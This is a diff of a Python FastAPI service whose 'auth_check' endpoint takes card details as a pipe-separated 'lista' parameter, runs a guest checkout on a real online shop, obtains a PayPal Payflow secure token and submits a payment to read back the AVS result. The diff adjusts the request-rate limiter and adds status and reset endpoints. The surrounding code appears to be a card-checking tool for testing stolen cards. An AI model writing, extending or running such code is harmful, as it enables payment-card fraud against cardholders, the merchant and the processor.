@@ -6,28 +6,27 @@ from faker import Faker
 from bs4 import BeautifulSoup
 import traceback
 
-REQUEST_LIMIT = 3000
+# Global request counter - simple and effective
+REQUEST_LIMIT = 2000
+request_count = 0
 
-async def limit_requests(request: Request):
+async def limit_requests():
     """
-    Dependency that bumps a global counter and
-    rejects once we hit REQUEST_LIMIT.
+    Simple dependency that tracks global request count
     """
-    # Initialize on first access
-    if not hasattr(request.app.state, "req_count"):
-        request.app.state.req_count = 0
-
-    if request.app.state.req_count >= REQUEST_LIMIT:
+    global request_count
+    
+    if request_count >= REQUEST_LIMIT:
         raise HTTPException(
             status_code=status.HTTP_429_TOO_MANY_REQUESTS,
-            detail=f"Request limit of {REQUEST_LIMIT} reached"
+            detail=f"Request limit of {REQUEST_LIMIT} reached. Current count: {request_count}"
         )
-
-    request.app.state.req_count += 1
+    
+    request_count += 1
+    print(f"Request count: {request_count}/{REQUEST_LIMIT}")  # Debug logging
     
 def generate_random_device_id():
     return hashlib.sha256(os.urandom(32)).hexdigest()[:random.randint(8, 36)]
-
 
 def cap(string: str, start: str, end: str) -> str:
     try:
@@ -35,15 +34,35 @@ def cap(string: str, start: str, end: str) -> str:
         str_parts = str_parts[1].split(end)
         return str_parts[0]
     except IndexError:
-        raise None
-    
+        return None
+
+# Create the router with dependency
 auth_check = APIRouter(
     prefix="/auth_check",
-    dependencies=[Depends(limit_requests)]  # ← apply to **all** routes in this router
+    dependencies=[Depends(limit_requests)]
 )
+
+# Optional: Add an endpoint to check current count
+@auth_check.get("/status")
+async def get_status():
+    """Get current request count status"""
+    global request_count
+    return {
+        "current_count": request_count,
+        "limit": REQUEST_LIMIT,
+        "remaining": REQUEST_LIMIT - request_count
+    }
+
+# Optional: Reset counter (for testing)
+@auth_check.post("/reset")
+async def reset_counter():
+    """Reset the request counter"""
+    global request_count
+    request_count = 0
+    return {"message": "Counter reset", "current_count": request_count}
+
 @auth_check.get("/")
 async def tokenize_card(request: Request):
-
     try:
         lista = request.query_params.get('lista').split('|')
         cc = lista[0]
@@ -95,7 +114,6 @@ async def tokenize_card(request: Request):
         )
 
         # Get cart and checkout ID:
-
         headers = {
             'Connection': 'keep-alive',
             'Referer': 'https://www.lathewerks.com/evox-ti-ecu-bracket.html',
@@ -105,9 +123,7 @@ async def tokenize_card(request: Request):
         response = session.get('https://www.lathewerks.com/checkout/', cookies=cookies, headers=headers)
         cart_id = cap(response.text, '"entity_id":"','","store_id"')
 
-
         # Set shipping/billing:
-
         headers = {
                 'Accept': '*/*',
                 'Content-Type': 'application/json',
@@ -164,7 +180,6 @@ async def tokenize_card(request: Request):
         response = session.post(f'https://www.lathewerks.com/rest/default/V1/guest-carts/{cart_id}/shipping-information',headers=headers,json=json_data)
 
         # Get secure token:
-
         headers = {
             'Accept': 'application/json',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -186,10 +201,8 @@ async def tokenize_card(request: Request):
         response = session.post('https://www.lathewerks.com/paypal/transparent/requestSecureToken/',headers=headers,data=data)
         secure_token = response.json()['payflowpro']['fields']['securetoken']
         secure_token_id = response.json()['payflowpro']['fields']['securetokenid']
-        # return response.text
 
         # Make payment:
-
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -212,7 +225,7 @@ async def tokenize_card(request: Request):
 
         response = session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
         soup = BeautifulSoup(response.text, 'html.parser')
-        # print(soup)
+        
         tag = soup.find('input', attrs={'name': 'AVSZIP'})
         AVSZIP = tag.get('value') if tag else "U"
 
